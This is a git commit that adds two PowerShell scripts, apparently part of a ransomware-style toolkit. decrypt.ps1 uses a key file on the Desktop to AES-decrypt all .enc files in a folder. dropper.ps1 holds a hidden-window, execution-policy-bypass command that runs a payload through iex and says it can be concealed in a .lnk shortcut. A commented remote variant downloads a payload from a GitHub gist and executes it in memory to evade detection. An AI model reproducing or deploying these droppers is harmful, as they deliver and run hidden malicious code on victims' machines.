5fc54bd5eae7679540d64fcd62ef03dc3596443f
H0neyBadger <h0neyb4dgerdc@gmail.com>
2016-11-06 13:07:57 +0100

    first definition

---
+++ decrypt.ps1
@@ -0,0 +1,27 @@
+﻿
+# read User Key
+$userDesk = [Environment]::GetFolderPath("Desktop")
+$key = Get-Content "$userDesk/H0ney.key" -Encoding byte
+
+# create ps AES objects
+# sources
+# http://indogeeks.com/how-to-use-aes-encryption-in-powershell/
+# https://gist.github.com/ctigeek/2a56648b923d198a6e60
+$AES = New-Object System.Security.Cryptography.AesManaged
+Write-Host "AES Key: $key"
+$AES.Key = $key
+$AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+
+# ls list all files ending by .enc
+Get-ChildItem .\*.enc | ForEach-Object {
+    $bytes = Get-Content "$($_.FullName)" -Encoding byte
+    $oriname = "$($_.FullName)" -replace '\.enc$','' 
+    # retrieve IV trom 16 first bytes
+    $iv = $bytes[0..15]
+    $AES.iv = $iv
+    Write-Host "IV: $iv"
+    $decryptor = $AES.CreateDecryptor()
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
+    Set-Content -Value $unencryptedData -LiteralPath $oriname -Encoding byte
+    Write-Host (Get-Content $oriname)
+}
---
+++ dropper.ps1
@@ -0,0 +1,6 @@
+﻿
+# you can hide one of these cmd in a lnk windows file
+powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "gc .\payload.txt | iex"
+# for remote execution
+# the file is downloaded and executed in memory to avoid detection 
+# powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://gist.github.com/H0neyBadger/0b664520e7aa71a37fcd14238f9603cb/raw/payload.txt') | iex"
